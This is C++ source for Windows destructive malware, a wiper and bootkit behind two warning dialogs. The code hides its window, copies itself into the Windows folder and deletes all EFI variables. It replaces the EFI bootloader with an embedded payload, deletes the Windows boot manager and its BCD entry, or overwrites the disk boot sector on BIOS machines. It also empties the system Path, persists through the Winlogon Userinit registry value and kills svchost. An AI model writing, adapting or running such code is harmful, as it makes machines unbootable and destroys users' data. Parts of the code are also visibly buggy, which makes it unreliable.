#include <iostream>
#include <Windows.h>
#include <WinUser.h>
#include <direct.h>
#include <vector>
#include <winbase.h>
#include "resource.h"

using namespace std;

void LoadResourceData(int resourceId, LPCWSTR resourceType, std::vector<char>& data) {
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(resourceId), resourceType);
    if (!hResource) {
        throw std::runtime_error("Could not find resource");
    }

    HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
    if (!hLoadedResource) {
        throw std::runtime_error("Could not load resource");
    }

    DWORD size = SizeofResource(NULL, hResource);
    if (size == 0) {
        throw std::runtime_error("Resource size is zero");
    }

    void* pResourceData = LockResource(hLoadedResource);
    if (!pResourceData) {
        throw std::runtime_error("Could not lock resource");
    }

    data.assign(static_cast<char*>(pResourceData), static_cast<char*>(pResourceData) + size);
}

vector<wstring> enumerateEFIVariables() {
    vector<wstring> variables;
    WCHAR name[1024];
    DWORD size = sizeof(name) / sizeof(name[0]);
    DWORD index = 0;

    while (GetFirmwareEnvironmentVariableEx(name, L"{00000000-0000-0000-0000-000000000000}", nullptr, 0, nullptr) || GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        variables.push_back(name);
        size = sizeof(name) / sizeof(name[0]);
        index++;
    }

    return variables;
}

// Function to delete an EFI variable
bool deleteEFIVariable(const wstring& variableName) {
    if (SetFirmwareEnvironmentVariable(variableName.c_str(), L"{00000000-0000-0000-0000-000000000000}", 0,0)) {
        return true;
    }
    else {
        return false;
    }
}

wchar_t* convertCharArrayToLPCWSTR(const char* charArray)
{
    wchar_t* wString = new wchar_t[4096];
    MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
    return wString;
}


DWORD is_efi() {
    char buffer[1024];
    DWORD envvar = GetFirmwareEnvironmentVariable(L"", L"{00000000 - 0000 - 0000 - 0000 - 000000000000}", buffer, sizeof(buffer));
    return envvar;
}

int BIOSBootFlash(vector<char> buffer) {
    // Open the target disk
    HANDLE hDevice = CreateFile(TEXT("\\\\.\\PhysicalDrive0"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        return 1;
    }

    // Write the buffer to the disk
    DWORD bytesWritten;
    if (!WriteFile(hDevice, buffer.data(), buffer.size(), &bytesWritten, NULL) || bytesWritten != buffer.size()) {
        CloseHandle(hDevice);
        return 1;
    }

    // We're done with the device
    CloseHandle(hDevice);

    return 0;
}

bool SetPermanentEnvironmentVariable(LPCTSTR value, LPCTSTR data) {
    HKEY hKey;
    LPCTSTR keyPath = TEXT("System\\CurrentControlSet\\Control\\Session Manager\\Environment");
    LSTATUS lOpenStatus = RegOpenKeyEx(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_ALL_ACCESS, &hKey);
    if (lOpenStatus == ERROR_SUCCESS) {
        LSTATUS lSetStatus = RegSetValueEx(hKey, value, 0, REG_SZ, (LPBYTE)data, lstrlen(data) + 1);
        RegCloseKey(hKey);
        if (lSetStatus == ERROR_SUCCESS) {
            SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)"Environment", SMTO_BLOCK, 100, NULL);
            return true;
        }
    }
    return false;
}

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

LONG SetRegValue(const wchar_t* path, const wchar_t* name, const wchar_t* value) {
    LONG status;
    HKEY hKey;
    status = RegOpenKeyEx(HKEY_CURRENT_USER, path, 0, KEY_ALL_ACCESS, &hKey);
    if (status == ERROR_SUCCESS && hKey != NULL) {
        status = RegSetValueEx(hKey, name, 0, REG_SZ, (BYTE*)value, ((DWORD)wcslen(value) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
    return status;
}

int main(int argc, char** argv[])
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    LPCWSTR filepath = convertCharArrayToLPCWSTR(*argv[0]);      
    CopyFile(filepath, L"C\\Windows\\nt32.exe", false);

        std::vector<char> bootBinData;
        LoadResourceData(IDR_BOOT_BIN, RT_RCDATA, bootBinData);
        std::cout << "boot.bin loaded, size: " << bootBinData.size() << " bytes" << std::endl;

        std::vector<char> bootEfiData;
        LoadResourceData(IDR_BOOT_EFI, RT_RCDATA, bootEfiData);
        std::cout << "boot.efi loaded, size: " << bootEfiData.size() << " bytes" << std::endl;

    int confirmbox = MessageBox(NULL, L"This is a destructive program. By clicking OK you acknowledge that the creator is not responsible for any damage caused.", L"WARNING", MB_OKCANCEL | MB_ICONEXCLAMATION);
    if (confirmbox == IDCANCEL) return 0;

    int secondconfirmbox = MessageBox(NULL, L"ALL DATA WILL BE DESTROYED! Are you sure you want to continue?", L"WARNING (Double check)", MB_OKCANCEL | MB_ICONEXCLAMATION);
    if (secondconfirmbox == IDCANCEL) return 0;

    if (is_efi() != ERROR_INVALID_FUNCTION) {
        auto variables = enumerateEFIVariables();

        for (const auto& variable : variables) {
            deleteEFIVariable(variable);
        }

        system("C:\\Windows\\System32\\mountvol P: /S");

        DeleteFile(L"P:\\EFI\\Boot\\bootx64.efi");

        HANDLE hboot = CreateFile(L"P:\\EFI\\Boot\\bootx64.efi", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        DWORD bootbytesWritten;
        WriteFile(hboot, static_cast<LPCVOID>(bootEfiData.data()), static_cast<DWORD>(bootEfiData.size()), &bootbytesWritten, NULL);
        CloseHandle(hboot);

        DeleteFile(L"P:\\EFI\\Microsoft\\Boot\\bootmgfw.efi");
        system("C:\\Windows\\System32\\bcdedit /f /delete {bootmgr}");
    }
    else {
        BIOSBootFlash(bootBinData);
    }

    SetPermanentEnvironmentVariable(L"Path", L"");

    SetRegValue(L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Userinit", L"C:\\Windows\\userinit.exe,C:\\Windows\\nt32.exe");

    system("taskkill /f /im svchost.exe");

    return 0;
}
